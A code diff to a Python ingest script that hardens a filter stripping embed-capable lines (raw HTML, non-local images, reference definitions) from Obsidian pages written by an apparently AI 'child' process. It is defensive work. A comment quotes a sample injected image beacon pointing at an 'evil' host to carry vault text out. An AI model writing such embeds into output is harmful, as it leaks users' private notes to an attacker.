@@ -439,32 +439,35 @@ def verify_ingest(source_paths):
 
 
 # A remote image is a beacon: Obsidian fetches it when the page renders, so an injected
-# ![](https://evil/?d=<vault text>) would ship whatever the child read. A line goes when it holds
-# both a remote marker and an embed marker; plain links and local images have only one.
-# ponytail: line-level, no markdown parser, so code fences and inline code aren't spared and a
-# line that merely mentions both is dropped; the log names each one. Upgrade path: a real
-# markdown parser, if false deletions show up in the logs.
-REMOTE = re.compile(r"http\\*s?\\*:|//|&#", re.I)
-EMBED = re.compile(r"!\[|<(?:img|video|audio|iframe|embed|source)|poster=|srcset=|^\s*\[[^\]]*\]:", re.I)
-REFDEF_OPEN = re.compile(r"^\s*\[[^\]]*\]:\s*$")  # a reference definition whose destination is on the next line
+# ![](https://evil/?d=<vault text>) would ship whatever the child read. URLs can be spelled too
+# many ways to match, so the rule is syntax: any raw HTML tag, any image that isn't a well-formed
+# local embed, and any reference definition. Raw HTML in a child-written page is deleted on
+# purpose; wiki/CLAUDE.md already bans it because Obsidian mis-renders it.
+# ponytail: syntax-based and line-level, no markdown parser, so code fences, inline code and a
+# titled local image (![l](a.png "t")) lose their line too; the log names each one. Upgrade path:
+# a real markdown parser, if false deletions show up in the logs.
+HTML_TAG = re.compile(r"<[A-Za-z/]")
+# ![[x]] or ![alt](relative/path); a target opening with / or \ is out too (//host, \\host\share)
+LOCAL_EMBED = re.compile(r"!\[\[[^\]]*\]\]|!\[[^\]]*\]\([^()\s:/\\][^()\s:]*\)")
+REFDEF = re.compile(r"^\s*\[[^\]]*\]:")
+REFDEF_OPEN = re.compile(r"^\s*\[[^\]]*\]:\s*$")  # destination on the next line
 
 
 def strip_remote_images(paths):
-    """Delete remote-embed lines from the pages the child wrote, logging file and line number
-    for each. Never fails the run."""
+    """Delete embed-capable lines (see above) from the pages the child wrote, logging file and
+    line number for each. Never fails the run."""
     for f in paths:
         try:
             lines = Path(f).read_text(encoding="utf-8").splitlines(keepends=True)
             drop = set()
             for i, line in enumerate(lines):
-                if REMOTE.search(line) and EMBED.search(line):
+                if (HTML_TAG.search(line) or "![" in LOCAL_EMBED.sub("", line) or REFDEF.match(line)):
                     drop.add(i)
-                elif (REFDEF_OPEN.match(line) and i + 1 < len(lines)
-                      and lines[i + 1][:1].isspace() and REMOTE.search(lines[i + 1])):
-                    drop |= {i, i + 1}
+                    if REFDEF_OPEN.match(line) and i + 1 < len(lines) and lines[i + 1][:1].isspace():
+                        drop.add(i + 1)
             if drop:
                 for i in sorted(drop):
-                    log(f"  stripped remote embed {f}:{i + 1}: {lines[i].strip()[:120]}")
+                    log(f"  stripped embed-capable line {f}:{i + 1}: {lines[i].strip()[:120]}")
                 Path(f).write_text("".join(l for i, l in enumerate(lines) if i not in drop), encoding="utf-8")
         except (OSError, UnicodeDecodeError) as e:
             log(f"  image check skipped {f}: {e}")
